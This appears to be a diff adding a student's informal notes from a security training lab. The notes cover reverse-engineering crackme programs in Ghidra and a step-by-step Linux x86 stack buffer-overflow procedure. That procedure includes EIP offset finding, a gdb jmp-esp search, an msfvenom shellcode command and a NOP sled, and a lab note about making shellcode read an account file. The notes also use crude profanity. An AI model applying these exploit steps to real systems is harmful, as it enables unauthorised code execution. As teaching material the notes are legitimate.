@@ -1,4 +1,5 @@
 Security
+xfreerdp /u:student /v:10.50.33.144 -dynamic-resolution +glyph-cache +clipboard
 
 Darknet diaries
 
@@ -325,6 +326,150 @@ Win-ops station will be the primary thing we will be using
 
 
 
+Demo 1
+Opens up a cmd prompt with Enter Key: showing up to the user, after typing in random stuff it says Failed!!. and then closes. If typing in 123 it will say Success!!.
+Open up Ghidra and dissassemble
+
+Demo 2
+After running it opens up a cmd prompt "Enter Key:" is displayed and will disappear after running a random key. It will say "123 is not the string" if you typed in 123. Key might be the key, after typing it in it says Success. and disappears. 
+
+
+
+entry.exe
+After running it it opens a cmd prompt that is asking for a key, if entered wrong it says Invalid Key. If entered 123@magicKey it will return Success.
+
+
+
+basic1.exe
+After running it, it opens a cmd prompt that is asking for a key, if entered wrong it says Invalid Key. 
+Open up Ghidra and dissassemble
+Search strings for enter
+92, 138, 184, 230, 276, 322, 368, 414, 460, 506
+echo 2990 | md5sum
+
+
+sdst.exe
+When ran it opens a cmd prompt and asks for an enter key, if key is Invalid it will tell you. Also creates two files secret1.txt (0b and blank) and secret2.txt (1KB and has 8011 in it)
+Open Ghidra and dissassemble 
+fuckface has secret2.txt opened with it which has a value of 8011 in it, meaning that secret.txt that is opened with shitter is the empty file. 
+
+
+
+sdst2.exe
+Opens window that says Press the Enter Key and creates secret3.txt and some registery key called KEYED3 on the code. If the chucklefuck's strlen is not equal to zero then it and the other vairable king will be compared to char. If both of these files are filled with the words fuck as I did, it will print back success.
+
+
+
+
+sdst3.exe
+Says windows version doesn't want to run
+Open Ghidra and dissassemble
+
+
+
+
+
+
+
+
+
+
+
+
+Exploitation Development PART 2
+_______________________________________________________________________________________________________________________
+Buffer overflows
+We will be conducting a buffer overflow, just follow the steps and don't skip over. Monkey brain it. THIS WILL TAKE A LONG TIME, so maybe skip over and get other ones done on the test first.
+
+Heap
+Memory that can be allocated and deallocated
+
+Stack
+A contiguous section of memory used for passing arguments
+
+Registers
+Storage elements as close as possible to the central processing unit (CPU)
+
+Instruction Pointer (IP)
+a.k.a Program Counter (PC), contains the address of next instruction to be executed
+
+Stack Pointer (SP)
+Contains the address of the NEXT AVAILABLE space on the stack
+
+Base Pointer (BP)
+The base of the stack
+
+Function
+Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
+
+Shellcode
+The code that is executed once an exploit successfully takes advantage of a vulnerability
+Code that is written in byte format that gets you ideally a shell depending on the level of the exploit
+
+
+Buffer Overflow Defenses
+    Non executable (NX) stack *most new machines have this*
+    Address Space Layout Randomization (ASLR) *turn this OFF so we can predict it* IMPORTANT
+    Data Execution Prevention (DEP) *very similar to NX but made for windows?*
+    Stack Canaries *bonus question involving the ctf, if a canary dies the program will cease execution. Older method but popular.* IMPORTANT
+    Position Independent Executable (PIE) *=
+
+Technical Help
+
+Utilizing tools such as:
+    IDA, GHIDRA
+    GDB, MONA, IMMUNITY *IMPORTANT*
+    BASH, PYTHON *IMPORTANT*
+
+
+
+
+
+
+
+Taking user input. With either this or parameters.
+When inputing start with random strings, then try to overload it. After spamming a I got a segmentation fault.
+If on an adversaries machine use absolute
+Every C program has main in there at first
+gdb *file*
+pdisass main
+ignore get_pc_thunk
+pdisass getuserinput
+gets@plt name is gets
+gets() is vulnerable because it does not take null something, making it so it can be buffer overflowed
+ALWAYS LOOK INTO USER MADE FUNCTIONS
+Develope an exploit using python
+./func <<< $(python web_exdemo.py)
+^ For when it takes user input
+./func $(python web_exdemo.py)
+if it takes parameters just fill it in
+use wiremask.eu to make a pattern and replace the overflow variable in the web_exdemo.py
+then go into gdb func 
+run <<< $(python web_exdemo.py)
+then paste the EIP to Register value
+Take the Offset and change the A spam to it, then use the eip and send four bytes of whatever you want (B)
+now raw dog gdb
+env - gdb func
+show env
+unset env LINES
+unset en COLUMNS
+show env (make sure it is empty)
+run
+spam a for a while
+info proc map
+find /b 0xf7de1000,0xf7ffe000,0xff,0xe4
+ - first value is the line right under the heap, the second is the one right above the stack, the other two stay the same
+ - take any 5 of the things you see
+ - reverse the byte order of the hex values you got
+ - separate them by 2 characters each and reverse the bitch
+msfvenom *to create our shell code*
+msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python 
+---------------------- LINUX/x86/EXEC CAN ALWAYS BE USED -------------------------------
+add a nop = "\x90" * 15 to your code
+
+
+inventory
+What you need is the memory from the .111 machine and you need to set up the msfvenom to cat the account. I set up the program on the lin-ops and scp it over with scp -P 1620 inven.py comrade@127.0.0.1:.
 
 
 
@@ -339,9 +484,4 @@ Win-ops station will be the primary thing we will be using
 
 
 
-
-
-
-
-
-
+wiremask.eu
